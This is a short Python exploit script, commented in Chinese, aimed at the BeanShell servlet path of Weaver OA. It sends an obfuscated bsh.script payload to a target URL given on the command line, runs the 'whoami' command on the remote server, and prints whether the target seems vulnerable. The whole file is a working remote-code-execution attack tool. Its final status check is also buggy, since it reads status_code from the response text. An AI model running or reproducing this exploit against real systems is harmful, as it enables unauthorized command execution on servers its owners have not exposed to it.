
import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/weaver/bsh.servlet.BshServlet，参数是bsh.script',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/weaver/bsh.servlet.BshServlet"  # 移除末尾的斜杠
    else:
        url = args.url + "/weaver/bsh.servlet.BshServlet"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

payload = {
    'bsh.script': 'eval%00("ex"%2b"ec(\"whoami\")");',
    'bsh.servlet.captureOutErr': 'true',
    'bsh.servlet.output': 'raw'
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

response = requests.post(url, data=payload, headers=headers)
if response.text.status_code == 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞,执行命令为：whoami"+ response.text)
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")

